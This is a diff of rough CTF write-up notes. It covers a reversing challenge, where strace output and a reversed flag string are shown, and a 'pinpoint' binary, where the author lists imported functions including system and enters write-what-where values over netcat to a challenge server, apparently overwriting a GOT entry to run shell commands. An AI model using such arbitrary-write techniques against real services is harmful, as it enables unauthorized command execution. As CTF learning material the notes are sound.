@@ -104,14 +104,9 @@ and we obtain Seal_iSbhchc_kp_tfl_o}{ooSd -> still no sense..
 
 
 we try to run strace : 
-one-by-one: cannot open `one-by-one' (No such file or directory)
-secarea@D1040H:~/one-by-one$ file one_by_one
-one_by_one: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0d0d03c0b277315496688578f2103773793c163d, not stripped
-secarea@D1040H:~/one-by-one$ strings one_by_one | less
-secarea@D1040H:~/one-by-one$ echo "dSoo{}o_lft_pk_chchbSi_laeS" | rev
-Seal_iSbhchc_kp_tfl_o}{ooSd
-secarea@D1040H:~/one-by-one$ ^C
+
 secarea@D1040H:~/one-by-one$ strace -s 1000 ./one_by_one
+
 execve("./one_by_one", ["./one_by_one"], 0x7fffe9e9a0d0 /* 27 vars */) = -1 EACCES (Permission denied)
 strace: exec: Permission denied
 +++ exited with 1 +++
@@ -160,6 +155,41 @@ write(1, "Hello, world!\n", 14Hello, world!
 )         = 14
 exit_group(0)                           = ?
 +++ exited with 0 +++
+
+The raw string is  : dSoo{}o_lft_pk_chchbSi_laeS
+It has to have the structure : SSS{...}
+
+
+### Binary: Qualifiers: Pinpoint
+
+We run  strace -s 1000 ./pinpoint and we discover the output that we will get if we run ./pinpoint : address to write to: 
+The program might have a memory leak
+
+By running strings pinpoint | less -> we discover : 
+Found functions:
+__isoc99_scanf → Takes user input → might ask you for something
+
+printf → Will print responses (could leak info)
+
+### system →  If this is called with user input, you could potentially get command execution
+
+__stack_chk_fail → Stack protector is enabled, so classic buffer overflows might be detected
+
+setvbuf, stdout → Just standard IO handling
+
+what we see: 
+0000000000601020 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5
+0000000000601038 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5
+0000000000601040 R_X86_64_JUMP_SLOT  __isoc99_scanf@GLIBC_2.7
+
+secarea@D1040H:~$ nc 141.85.224.99 31337
+address to write to: 6295616
+value to write: 6295584
+/bin/ls -la
+secarea@D1040H:~$
+
+
+
 
 
 
